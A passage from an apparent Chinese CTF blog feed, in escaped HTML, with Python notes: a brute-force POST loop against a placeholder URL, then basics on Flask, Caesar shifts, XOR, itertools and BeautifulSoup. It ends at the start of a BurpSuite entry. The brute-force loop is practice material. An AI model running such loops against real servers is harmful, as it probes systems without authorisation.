data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token builtin&#34;&gt;setattr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dst&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; k&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; v&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;7用python编写程序发送post到服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7用python编写程序发送post到服务器&#34;&gt;#&lt;/a&gt; 7. 用 python 编写程序发送 POST 到服务器&lt;/h3&gt;
&lt;p&gt;简单的脚本爆破写法&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;xxx&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;max_len&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; len_size &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;max_len&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;len_size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#39;len[&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;]&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;fffffilm&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;尝试长度: &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;len_size&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;, 服务器响应: &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;8main&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8main&#34;&gt;#&lt;/a&gt; 8.&lt;strong&gt;main&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;debug &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;run&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;em&gt;当.py 文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py 文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-2&#34;&gt;#&lt;/a&gt; &lt;/h3&gt;
&lt;h3 id=&#34;9if-else特殊写法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#9if-else特殊写法&#34;&gt;#&lt;/a&gt; 9.if else 特殊写法&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shift &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;char&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; char&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;islower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;char&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里 if char.islower () 为真，则执行前面，否则执行后面。&lt;/p&gt;
&lt;h3 id=&#34;10python中的&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#10python中的&#34;&gt;#&lt;/a&gt; 10.python 中的 ^&lt;/h3&gt;
&lt;p&gt;^ 为异或，计算优先级最低。&lt;/p&gt;
&lt;h3 id=&#34;11startswith-和-endswith-方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11startswith-和-endswith-方法&#34;&gt;#&lt;/a&gt; 11.startswith 和 endswith 方法&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;startswith&lt;/code&gt;  和  &lt;code&gt;endswith&lt;/code&gt;  是字符串（ &lt;code&gt;str&lt;/code&gt; ）对象的内置方法，用于检查字符串的前缀和后缀。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;code&gt;startswith(prefix)&lt;/code&gt; &lt;/strong&gt;：检查字符串是否以指定的前缀开始。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;code&gt;endswith(suffix)&lt;/code&gt; &lt;/strong&gt;：检查字符串是否以指定的后缀结束。&lt;/p&gt;
&lt;h3 id=&#34;12itertoolsproduct&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12itertoolsproduct&#34;&gt;#&lt;/a&gt; 12.itertools.product&lt;/h3&gt;
&lt;p&gt;计算输入可迭代对象的笛卡尔积&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; itertools&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 计算两个列表的笛卡尔积&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; itertools&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;product&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;B&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; item &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; result&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;item&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 输出:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# (1, &#39;A&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# (1, &#39;B&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# (2, &#39;A&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# (2, &#39;B&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;13bs4模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#13bs4模块&#34;&gt;#&lt;/a&gt; 13.bs4 模块&lt;/h3&gt;
&lt;p&gt;BeautifulSoup, 从网页中抓取数据&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; bs4 &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; BeautifulSoup&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;用 requests 打开一个网址&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;https://www.baidu.com&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;lxml&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encoding&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#print (r1.text)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;创建一个 BeautifulSoup 对象&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bs_1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;BeautifulSoup&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;lxml&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#print(bs_1)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;解析器&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;使用方法&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;优势&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;python 标准库&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BeautifulSoup(html, &amp;quot;html.parser&amp;quot;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1. Python 的内置标准库 &amp;lt;br&amp;gt;2. 执行速度适中 &amp;lt; br&amp;gt;3. 文档容错能力强&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;lxml HTML&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BeautifulSoup(html, &amp;quot;lxml&amp;quot;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1. 速度快 &amp;lt;br&amp;gt;2. 文档容错能力强&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;lxml XML&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BeautifulSoup(html, [&amp;quot;lxml&amp;quot;, &amp;quot;xml&amp;quot;])&lt;/code&gt; &amp;lt;br&amp;gt; &lt;code&gt;BeautifulSoup(html, &amp;quot;xml&amp;quot;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1. 速度快 &amp;lt;br&amp;gt;2. 唯一支持 XML 的解析器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;html5lib&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BeautifulSoup(html, &amp;quot;html5lib&amp;quot;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1. 最好的容错性 &amp;lt;br&amp;gt;2. 以浏览器的方式解析文档 &amp;lt; br&amp;gt;3. 生成 HTML5 的文档&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;然后通过这个对象来实现对获取到的源码进行筛选和处理&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bs_1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prettify&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#格式化输出全部内容&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bs_1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;标签名&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#标签名有 html,head,title,meta,body,script,style 等等&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;#标签名有 html,head,title,meta,body,script,style 等等&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;text_element &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; soup&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;find&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;p&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;text&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bs_1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prettify&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#格式化输出全部内容&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2025/01/06/CTF/Web/BurpSuite/</guid>
            <title>BurpSuite</title>
            <link>https://ly1tnt.github.io/2025/01/06/CTF/Web/BurpSuite/</link>
            <category term="CTF" scheme="https://ly1tnt.github.io/categories/CTF/" />
            <category term="Web" scheme="https://ly1tnt.github.io/categories/CTF/Web/" />
            <pubDate>Mon, 06 Jan 2025 20:18:48 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;burpsuite&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#burpsuite&#34;&gt;#&lt;/a&gt; BurpSuite&lt;/h1&gt;
&lt;p&gt;若要使用 BurpSuite 发送 POST 请求&lt;/p&gt;
